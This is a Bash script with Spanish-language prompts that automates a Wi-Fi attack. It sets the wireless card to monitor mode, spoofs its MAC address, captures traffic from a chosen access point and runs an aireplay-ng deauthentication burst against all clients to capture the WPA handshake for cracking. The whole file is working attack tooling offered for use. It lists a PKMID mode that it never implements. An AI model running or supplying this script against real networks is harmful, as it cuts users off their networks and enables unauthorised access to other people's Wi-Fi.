#!/bin/bash

# Author: Anthony A Hack4u - WifiPwn

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=nointeractive

trap ctrl_c INT

function ctrl_c () {
  echo -e "\n${yellowColour}[*]${endColour}${grayColour} Saliendo...${endColour}"
  tput cnorm
  ifconfig ${network_card} down
  iwconfig ${network_card} mode managed
  ifconfig ${network_card} up
  NetworkManager restart
  rm -f Capture* 2>/dev/null
  exit 0
}

function helpPanel() {
  echo -e "\n${yellowColour}[*]${endColour}${grayColour} Uso: ./wifiCracker.sh${endColour}"
  echo -e "\t${purpleColour}a)${endColourd}${yellowColour} Modo de ataque ${endColour}"
  echo -e "\t\t${redColour}Handshake attack${endColour}"
  echo -e "\t\t${redColour}PKMID${endColour}"
  echo -e "\t${purpleColour}n)${endColour}${yellowColour} Nombre de la tarjeta de red${endColour}\n"

  exit 0
}

function dependencies() {
  tput civis
  clear; dependencies=(aircrack-ng macchanger)

  echo -e "${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...${endColour}"
  sleep 2

  for program in "${dependencies[@]}"; do
    echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Herramienta: ${endColour}${purpleColour}$program${endColour}${blueColour}... ${endColour}"

    test -f /usr/bin/$program

    if [ "$(echo $?)" == "0" ]; then
      echo -e "${greenColour}(V)${endColour}"
    else 
      echo -e "${redColour}(F)${endColour}\n"
      echo -e "${yellowColourl}[*]${endColour}${grayColour} Instalando herramienta ${endColour}${blueColour}$program${endColour}${yellowColour}...${endColour}"
      apt-get install $program -y > /dev/null 2>&1
    fi; sleep 1
  done;
}

function startAttack() {
  clear
  echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando tarjeta de red...${endColour}\n"
  ifconfig ${network_card} down
  airmon-ng check kill > /dev/null 2>&1 
  iwconfig ${network_card} mode monitor
  macchanger -a ${network_card} > /dev/null 2>&1
  ifconfig ${network_card} up

  echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva direccion de MAC asignada${endColour}${purpleColour} $(macchanger -s ${network_card} | grep -i current | xargs | cut -d ' ' -f '3-100' )${endColour}"

  xterm -hold -e "airodump-ng ${network_card}" &
  airodump_xterm_PID=$!

  echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso: ${endColour}" && read apName 
  echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Canal del punto de acceso: ${endColour}" && read apChannel

  kill -9 $airodump_xterm_PID
  wait $airodump_xterm_PID 2>/dev/null

  xterm -hold -e "airodump-ng -c $apChannel -w Capture --essid $apName ${network_card}" &
  airodump_filter_xterm_PID=$! 

  xterm -hold -e "aireplay-ng -0 15 -e $apName -c FF:FF:FF:FF:FF:FF ${network_card}"
  
  sleep 10; kill -9 $airodump_filter_xterm_PID
  wait $airodump_filter_xterm_PID 2>/dev/null
}

# Main functionality

if [ "$(id -u)" == "0" ]; then
  
 declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do
    case $arg in
      a) attack_mode=$OPTARG; let parameter_counter+=1;;
      n) network_card=$OPTARG; let parameter_counter+=1;;
      h) helpPanel;;
    esac 
  done

  if [ $parameter_counter -ne 2 ]; then
    helpPanel
  else
    dependencies
    startAttack
    tput cnorm
    ifconfig ${network_card} down
    iwconfig ${network_card} mode managed
    ifconfig ${network_card} up
    NetworkManager restart
    #rm -f Capture* 2>/dev/null
  fi

else
  echo -e "\n${redColour}[*] No eres root${endColour}\n"
fi

